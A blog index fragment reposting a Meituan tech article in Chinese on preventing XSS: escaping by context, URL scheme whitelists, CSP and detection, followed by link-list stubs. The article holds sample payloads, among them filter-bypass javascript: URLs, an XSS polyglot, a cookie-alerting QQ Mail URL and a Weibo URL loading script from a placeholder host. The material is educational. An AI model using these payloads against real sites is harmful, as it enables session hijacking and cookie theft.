    <content type="text"><![CDATA[转载自美团技术团队，作者李阳，原文链接：https://tech.meituan.com/2018/09/27/fe-security.html 前端安全随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。 近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端人员在日常开发中不断预防和修复安全漏洞。本文是该系列的第一篇。 本文我们会讲解 XSS ，主要包括： XSS 攻击的介绍 XSS 攻击的分类 XSS 攻击的预防和检测 XSS 攻击的总结 XSS 攻击案例 XSS 攻击的介绍在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确： XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。 如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。 XSS 漏洞的发生和修复XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。 一个案例某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下： 12345&lt;input type="text" value="&lt;%= getParameter("keyword") %&gt;"&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&lt;%= getParameter("keyword") %&gt;&lt;/div&gt; 然而，在上线后不久，小明就接到了安全组发来的一个神秘链接： 1http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt; 小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。 可恶，中招了！小明眉头一皱，发现了其中的奥秘： 当浏览器请求 http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; 时，服务端会解析出请求参数 keyword，得到 &quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;，拼接到 HTML 中返回给浏览器。形成了如下的 HTML： 123456789&lt;input type="text" value="" /&gt;&lt;script&gt; alert('XSS');&lt;/script&gt;"&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是："&gt;&lt;script&gt; alert('XSS'); &lt;/script&gt;&lt;/div&gt; 浏览器无法分辨出 &lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; 是恶意代码，因而将其执行。 这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。 面对这种情况，我们应该如何进行防范呢？ 其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。 聪明的小明很快找到解决方法，把这个漏洞修复： 12345&lt;input type="text" value="&lt;%= escapeHTML(getParameter("keyword")) %&gt;"&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&lt;%= escapeHTML(getParameter("keyword")) %&gt;&lt;/div&gt; escapeHTML() 按照如下规则进行转义： |字符|转义后的字符| |-|-| |&amp;|&amp;amp;| |&lt;|&amp;lt;| |&gt;|&amp;gt;| |&quot;|&amp;quot;| |&#39;|&amp;#x27;| |/|&amp;#x2F;| 经过了转义函数的处理后，最终浏览器接收到的响应为： 12345678&lt;input type="text" value='"&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;'/&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;&lt;/div&gt; 恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。 通过这个事件，小明学习到了如下知识： 通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。 攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。 攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。 通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。 注意特殊的 HTML 属性、JavaScript API自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。 但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。 不久，小明又收到安全组的神秘链接：http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。 小明打开对应页面的源码，发现有以下内容： 1&lt;a href="&lt;%= escapeHTML(getParameter("redirect_to")) %&gt;"&gt;跳转...&lt;/a&gt; 这段代码，当攻击 URL 为 http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)，服务端响应就成了： 1&lt;a href="javascript:alert(&amp;#x27;XSS&amp;#x27;)"&gt;跳转...&lt;/a&gt; 虽然代码不会立即执行，但一旦用户点击 a 标签时，浏览器会就会弹出“XSS”。 可恶，又失策了… 在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。 原来不仅仅是特殊字符，连 javascript: 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。 小明眉头一皱，想到了解决办法： 1234567891011// 禁止 URL 以 "javascript:" 开头xss = getParameter("redirect_to").startsWith('javascript:');if (!xss) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; 跳转... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; 跳转... &lt;/a&gt;&#125; 只要 URL 的开头不是 javascript:，就安全了吧？ 安全组随手又扔了一个连接：http://xxx/?redirect_to=jAvascRipt:alert(&#39;XSS&#39;) 这也能执行？…..好吧，浏览器就是这么强大。 小明欲哭无泪，在判断 URL 开头是否为 javascript: 时，先把用户输入转成了小写，然后再进行比对。 不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接： 1http://xxx/?redirect_to=%20javascript:alert(&apos;XSS&apos;) %20javascript:alert(&#39;XSS&#39;) 经过 URL 解析后变成 javascript:alert(&#39;XSS&#39;)，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。 最终，小明选择了白名单的方法，彻底解决了这个漏洞： 1234567891011121314// 根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等allowSchemes = ["http", "https"];valid = isValid(getParameter("redirect_to"), allowSchemes);if (valid) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; 跳转... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; 跳转... &lt;/a&gt;&#125; 通过这个事件，小明学习到了如下知识： 做了 HTML 转义，并不等于高枕无忧。 对于链接跳转，如 &lt;a href=&quot;xxx&quot; 或 location.href=&quot;xxx&quot;，要检验其内容，禁止以 javascript: 开头的链接，和其他非法的 scheme。 根据上下文采用不同的转义规则某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中： 123&lt;script&gt; var initData = &lt;%= data.toJSON() %&gt;&lt;/script&gt; 插入 JSON 的地方不能使用 escapeHTML()，因为转义 &quot; 后，JSON 格式会被破坏。 但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的： 当 JSON 中包含 U+2028 或 U+2029 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。 当 JSON 中包含字符串 &lt;/script&gt; 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 &lt;script&gt; 标签等方法就可以完成注入。 于是我们又要实现一个 escapeEmbedJSON() 函数，对内联 JSON 进行转义。 转义规则如下： |字符|转义后的字符| |-|-| |U+2028|\u2028| |U+2029|\u2029| |&lt;|\u003c| 修复后的代码如下： 12&lt;script&gt;var initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt; 通过这个事件，小明学习到了如下知识： HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。 应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。 漏洞总结小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法： 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。 在标签的 href、src 等属性中，包含 javascript: 等可执行代码。 在 onload、onerror、onclick 等事件中，注入不受控制代码。 在 style 属性和标签中，包含类似 background-image:url(&quot;javascript:...&quot;); 的代码（新版本浏览器已经可以防范）。 在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）。 总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。 XSS 攻击的分类通过上述几个例子，我们已经对 XSS 有了一些认识。 什么是 XSSCross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。 XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。 而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。 在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。 这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？ 不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信： 来自用户的 UGC 信息 来自第三方的链接 URL 参数 POST 参数 Referer （可能来自不可信的来源） Cookie （可能来自其他子域注入） XSS 分类根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。 |类型|存储区|插入点| |-|-| |存储型 XSS|后端数据库|HTML| |反射型 XSS|URL|HTML| |DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript| 存储区：恶意代码存放的位置。 插入点：由谁取得恶意代码，并插入到网页上。 存储型 XSS存储型 XSS 的攻击步骤： 攻击者将恶意代码提交到目标网站的数据库中。 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。 反射型 XSS反射型 XSS 的攻击步骤： 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。 反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。 由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。 POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。 DOM 型 XSSDOM 型 XSS 的攻击步骤： 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。 XSS 攻击的预防通过前面的介绍可以得知，XSS 攻击有两大要素： 攻击者提交恶意代码。 浏览器执行恶意代码。 针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？ 输入过滤在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？ 答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。 那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？ 我们举一个例子，一个正常的用户输入了 5 &lt; 7 这个内容，在写入数据库前，被转义，变成了 5 &amp;lt; 7。 问题是：在提交阶段，我们并不确定内容要输出到哪里。 这里的“并不确定内容要输出到哪里”有两层含义： 用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( 5 &amp;lt; 7 )。 在前端中，不同的位置所需的编码也不同。 当 5 &amp;lt; 7 作为 HTML 拼接页面时，可以正常显示： 1&lt;div title="comment"&gt;5 &amp;lt; 7&lt;/div&gt; 当 5 &amp;lt; 7 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。 所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。 既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类： 防止 HTML 中出现注入。 防止 JavaScript 执行时，执行恶意代码。 预防存储型和反射型 XSS 攻击存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。 预防这两种漏洞，有两种常见做法： 改成纯前端渲染，把代码和数据分隔开。 对 HTML 做充分转义。 纯前端渲染纯前端渲染的过程： 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。 然后浏览器执行 HTML 中的 JavaScript。 JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。 在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。 转义 HTML如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。 常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 &amp; &lt; &gt; &quot; &#39; / 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善： |XSS 安全漏洞|简单转义是否有防护作用| |-|-| |HTML 标签文字内容|有| |HTML 属性值|有| |CSS 内联样式|无| |内联 JavaScript|无| |内联 JSON|无| |跳转链接|无| 所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。 例如 Java 工程里，常用的转义库为 org.owasp.encoder。以下代码引用自 org.owasp.encoder 的官方说明。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!-- HTML 标签内文字内容 --&gt;&lt;div&gt;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&lt;/div&gt;&lt;!-- HTML 标签属性值 --&gt;&lt;input value="&lt;%= Encode.forHtml(UNTRUSTED) %&gt;" /&gt;&lt;!-- CSS 属性值 --&gt;&lt;div style="width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;"&gt; &lt;!-- CSS URL --&gt; &lt;div style="background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;"&gt; &lt;!-- JavaScript 内联代码块 --&gt; &lt;script&gt; var msg = '&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;'; alert(msg); &lt;/script&gt; &lt;!-- JavaScript 内联代码块内嵌 JSON --&gt; &lt;script&gt; var __INITIAL_STATE__ = JSON.parse( '&lt;%= Encoder.forJavaScript(data.to_json) %&gt;' ); &lt;/script&gt; &lt;!-- HTML 标签内联监听器 --&gt; &lt;button onclick="alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');"&gt; click me &lt;/button&gt; &lt;!-- URL 参数 --&gt; &lt;a href="/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top" &gt; &lt;!-- URL 路径 --&gt; &lt;a href="/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;"&gt; &lt;!-- URL. 注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等--&gt; &lt;a href='&lt;%= urlValidator.isValid(UNTRUSTED) ? Encode.forHtml(UNTRUSTED) : "/404"%&gt;' &gt; link &lt;/a&gt;&lt;/a &gt;&lt;/a &gt; &lt;/div&gt;&lt;/div&gt; 可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。 预防 DOM 型 XSS 攻击DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。 在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute()等。 如果用 Vue/React 技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端 render 阶段避免 innerHTML、outerHTML 的 XSS 隐患。 DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。 1234567891011121314151617&lt;!-- 内联事件监听器中包含恶意代码 --&gt;![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)&lt;!-- 链接内包含恶意代码 --&gt;&lt;a href="UNTRUSTED"&gt;1&lt;/a&gt;&lt;script&gt; // setTimeout()/setInterval() 中调用恶意代码 setTimeout('UNTRUSTED'); setInterval('UNTRUSTED'); // location 调用恶意代码 location.href = 'UNTRUSTED'; // eval() 中调用恶意代码 eval('UNTRUSTED');&lt;/script&gt; 如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。 其他 XSS 防范措施虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。 Content Security Policy严格的 CSP 在 XSS 的防范中可以起到以下的作用： 禁止加载外域代码，防止复杂的攻击逻辑。 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。 合理使用上报可以及时发现 XSS，利于尽快修复问题。 关于 CSP 的详情，请关注前端安全系列后续的文章。 输入内容长度控制对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。 其他安全措施 HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。 验证码：防止脚本冒充用户提交危险操作。 XSS 的检测上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？ 经过一番搜索，小明找到了两个方法： 使用通用 XSS 攻击字符串手动检测 XSS 漏洞。 使用扫描工具自动检测 XSS 漏洞。 在Unleashing an Ultimate XSS Polyglot一文中，小明发现了这么一个字符串： 1jaVasCript: /*-/*`/*\`/*'/*"/**/ /* */ oNcliCk = alert(); //%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e 它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write() 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。 小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。 1http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E 除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 Arachni、Mozilla HTTP Observatory、w3af 等。 XSS 攻击的总结我们回到最开始提出的问题，相信同学们已经有了答案： XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。 不正确。因为： _ 防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。 _ 转义应该在输出 HTML 时进行，而不是在提交用户输入时。 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。 不正确。 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。 整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。 虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生： 利用模板引擎 开启模板引擎自带的 HTML 转义功能。例如： 在 ejs 中，尽量使用 &lt;%= data %&gt; 而不是 &lt;%- data %&gt; 。 避免内联事件 尽量不要使用 onLoad=&quot;onload(&#39;&#39;)&quot;、onClick=&quot;go(&#39;&#39;)&quot; 这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener() 事件绑定会更安全。 避免拼接 HTML 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。 时刻保持警惕 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。 增加攻击难度，降低攻击后果 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。 主动检测和发现 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。 XSS 攻击案例QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞攻击者发现 http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。 于是攻击者构建出一个 URL，并引导用户去点击： http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B 用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中： 123456789&lt;script&gt; getTop().location.href = '/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa' + '&amp;t=' + '&amp;d=bbbb'; return false;&lt;/script&gt;&lt;script&gt; alert(document.cookie);&lt;/script&gt;"+"... 浏览器接收到响应后就会执行 alert(document.cookie)，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。 新浪微博名人堂反射型 XSS 漏洞攻击者发现 http://weibo.com/pub/star/g/xyyyd 这个 URL 的内容未经过滤直接输出到 HTML 中。 于是攻击者构建出一个 URL，然后诱导用户去点击： 1http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt; 用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中： 1&lt;li&gt;&lt;a href="http://weibo.com/pub/star/g/xyyyd"&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;"&gt;按分类检索&lt;/a&gt;&lt;/li&gt; 浏览器接收到响应后就会加载执行恶意脚本 //xxxx.cn/image/t.js，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。 扩展阅读：Automatic Context-Aware Escaping上文我们说到： 合适的 HTML 转义可以有效避免 XSS 漏洞。 完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。 业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。 通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。 这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。 2009 年，Google 提出了一个概念叫做：Automatic Context-Aware Escaping。 所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。 在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则： 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url&#125;&#125;"&gt;&#123;&#123;.content&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则： 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title | htmlescaper&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url | urlescaper | attrescaper&#125;&#125;"&gt;&#123;&#123;.content | htmlescaper&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 目前已经支持 Automatic Context-Aware Escaping 的模板引擎有： go html/template Google Closure Templates 课后作业：XSS 攻击小游戏以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。 在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。 alert(1) to win prompt(1) to win XSS game 参考文献 Wikipedia. Cross-site scripting, Wikipedia. OWASP. XSS (Cross Site Scripting) Prevention Cheat Sheet, OWASP. OWASP. Use the OWASP Java Encoder-Use-the-OWASP-Java-Encoder), GitHub. Ahmed Elsobky. Unleashing an Ultimate XSS Polyglot, GitHub. Jad S. Boutros. Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems, Google Security Blog. Vue.js. v-html - Vue API docs, Vue.js. React. dangerouslySetInnerHTML - DOM Elements, React.]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F08%2FAI%2FAI%20%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[1234title: AI 传送门date: 2019-09-8 24:50:24tags: AIcategories: AI Tensorflow Tensorflow.js 官方中文文档]]></content>
  </entry>
  <entry>
    <title><![CDATA[前端传送门]]></title>
    <url>%2F2019%2F09%2F06%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[JavaScript 面试题集 33 Concepts Every JavaScript Developer Should Know React react 官网 技术网址 InfoQ IMWeb 美团技术团队 大牛们的思考沉淀 阿里9年，我总结的前端架构演进3大阶段及团队管理心法]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出 Python 模块机制]]></title>
    <url>%2F2019%2F09%2F01%2FPython%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%20Python%20%E6%A8%A1%E5%9D%97%E6%9C%BA%E5%88%B6%2F</url>
